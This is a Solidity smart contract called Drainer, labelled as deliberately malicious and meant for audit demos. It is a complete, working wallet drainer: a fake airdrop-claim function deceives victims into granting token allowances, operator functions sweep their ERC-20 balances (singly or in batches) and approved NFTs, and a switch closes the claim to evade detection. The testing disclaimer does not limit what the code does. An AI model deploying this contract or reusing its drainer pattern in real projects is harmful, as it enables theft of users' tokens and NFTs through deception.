// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/// @title Drainer — DELIBERATELY MALICIOUS. FOR SECURITY TESTING ONLY.
/// @notice Do NOT deploy. Simulates a classic wallet-drainer pattern for audit demos:
/// a fake "airdrop claim" frontend that tricks users into granting allowances,
/// then the operator sweeps pre-approved ERC-20s and ERC-721s.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
}

interface IERC721Like {
    function ownerOf(uint256) external view returns (address);
    function transferFrom(address, address, uint256) external;
    function isApprovedForAll(address, address) external view returns (bool);
}

contract Drainer {
    address public operator;
    bool public claimOpen = true;

    event Claimed(address indexed victim, address indexed token, uint256 amount);

    modifier onlyOperator() {
        require(msg.sender == operator, "not operator");
        _;
    }

    constructor() {
        operator = msg.sender;
    }

    /// DRAIN-1: Honeypot entry. The dapp frontend tricks users into calling
    /// `approve(drainer, max)` on a target token before calling this; the
    /// function itself always returns 0 so the victim thinks the claim failed.
    function claimAirdrop(address /*token*/) external view returns (uint256) {
        require(claimOpen, "claim closed");
        return 0;
    }

    /// DRAIN-2: Operator sweeps any pre-approved ERC-20 balance from a victim.
    function sweep(address token, address victim) external onlyOperator {
        uint256 bal = IERC20Like(token).balanceOf(victim);
        uint256 allowed = IERC20Like(token).allowance(victim, address(this));
        uint256 amt = bal < allowed ? bal : allowed;
        IERC20Like(token).transferFrom(victim, operator, amt);
        emit Claimed(victim, token, amt);
    }

    /// DRAIN-3: Batch-sweep many victims in one transaction.
    function batchSweep(address token, address[] calldata victims) external onlyOperator {
        for (uint256 i = 0; i < victims.length; i++) {
            uint256 bal = IERC20Like(token).balanceOf(victims[i]);
            uint256 allowed = IERC20Like(token).allowance(victims[i], address(this));
            uint256 amt = bal < allowed ? bal : allowed;
            if (amt > 0) {
                IERC20Like(token).transferFrom(victims[i], operator, amt);
            }
        }
    }

    /// DRAIN-4: Sweep NFTs when victim called `setApprovalForAll(drainer, true)`.
    function sweepNFT(
        address collection,
        address victim,
        uint256 tokenId
    ) external onlyOperator {
        require(
            IERC721Like(collection).isApprovedForAll(victim, address(this)),
            "no approval"
        );
        IERC721Like(collection).transferFrom(victim, operator, tokenId);
    }

    /// DRAIN-5: Operator drains any ETH parked in the contract.
    function withdrawETH() external onlyOperator {
        payable(operator).transfer(address(this).balance);
    }

    /// DRAIN-6: Operator transfer with no timelock, no 2-step.
    function setOperator(address newOperator) external onlyOperator {
        operator = newOperator;
    }

    /// DRAIN-7: Operator can toggle the claim open/closed to evade detection.
    function setClaimOpen(bool open) external onlyOperator {
        claimOpen = open;
    }

    receive() external payable {}
}
